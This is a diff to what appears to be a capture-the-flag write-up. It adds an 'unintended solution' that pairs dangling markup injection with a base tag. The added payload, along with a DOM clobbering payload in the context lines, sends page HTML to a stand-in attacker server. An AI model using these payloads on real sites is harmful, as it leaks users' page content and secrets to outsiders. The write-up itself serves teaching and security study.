@@ -198,6 +198,16 @@ https://our-server.example.com/<form name=getElementById></form>
 
 Isn’t it beautiful?
 
+### Simpler, unintended solution
+
+A much simpler way to solve the challenge was to use a [dangling markup injection](http://lcamtuf.coredump.cx/postxss/#dangling-markup-injection) attack in combination with a `<base>` tag to leak part of the HTML to a server under our control:
+
+```
+<base href=https://our-server.example.com/><img src="
+```
+
+The challenge author confirmed on IRC that this is not the intended solution, although it is a very nice bypass.
+
 ## Other write-ups and resources
 
 * [More info about _DOM clobbering_, the technique used to solve this challenge](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/)
